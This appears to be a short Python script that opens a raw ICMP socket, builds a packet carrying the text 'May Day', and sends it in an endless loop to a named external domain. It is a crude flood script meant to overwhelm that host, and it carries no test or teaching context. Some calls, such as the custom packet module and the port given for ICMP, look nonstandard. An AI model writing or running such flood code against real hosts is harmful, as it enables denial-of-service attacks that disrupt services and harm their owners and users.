import socket, sys, icmp

c = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname('icmp'))
packet = icmp.ICMPPacket()
data = packet.create(8, 88, 0, 0, 'May Day')
c.connect(('chenhuo.org', 22))
while True:
	c.send(data)
